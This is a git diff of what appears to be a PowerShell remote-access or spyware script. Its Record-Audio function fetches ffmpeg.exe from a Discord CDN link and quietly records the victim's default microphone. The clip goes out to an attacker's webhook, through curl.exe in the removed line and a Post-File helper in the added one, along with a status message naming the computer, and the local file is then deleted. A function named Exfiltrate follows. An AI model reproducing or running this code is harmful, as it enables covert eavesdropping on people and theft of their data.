@@ -176,6 +176,8 @@ while ($true) {
 
 Function Record-Audio{
 param ([int[]]$t)
+$contents = "$env:COMPUTERNAME $tick Recording Started for $t seconds.."
+Post-Message | Out-Null
 $Path = "$env:Temp\ffmpeg.exe"
 If (!(Test-Path $Path)){  
 $url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
@@ -187,12 +189,12 @@ Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterf
 function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
 $id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName
 
-$mp3Path = "$env:Temp\AudioClip.mp3"
+$filePath = "$env:Temp\AudioClip.mp3"
 if ($t.Length -eq 0){$t = 10}
-.$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $mp3Path
-curl.exe -F file1=@"$mp3Path" $hookurl | Out-Null
+.$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $filePath
+Post-File
 sleep 1
-rm -Path $mp3Path -Force
+rm -Path $filePath -Force
 }
 
 Function Exfiltrate {
